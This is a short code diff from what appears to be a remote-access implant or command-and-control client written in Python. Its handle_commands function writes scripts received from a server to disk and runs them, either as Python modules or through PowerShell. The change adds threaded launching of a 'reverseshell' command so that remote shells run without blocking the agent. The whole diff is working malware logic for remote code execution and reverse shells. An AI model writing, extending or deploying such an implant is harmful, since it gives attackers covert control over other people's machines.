@@ -80,7 +80,6 @@ def handle_commands(response, identifier):
 		f = open(save_path, "w+")
 		f.write(res['script'])
 		f.close()
-
 		## Execute the script file
 		if os.path.isfile(save_path):
 
@@ -88,8 +87,14 @@ def handle_commands(response, identifier):
 				## The dump directory is to be added to os path as python looks there for requires in case not in current directory
 				sys.path.append(os.path.abspath(dump_dir))
 				file =  __import__(filename)
-
-				command_output = file.execute_command()
+				## For reverse shell if we don't use threads it will block the script
+				if res['command'] == 'reverseshell':
+					import threading
+					t1 = threading.Thread(target=file.execute_command)
+					t1.start()
+					command_output = 'Started Reverse shell'
+				else:
+					command_output = file.execute_command()
 			else:
 				result = subprocess.run([r"powershell.exe", save_path], stdin=subprocess.PIPE , stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
 				command_output = result.stdout.decode('utf-8')
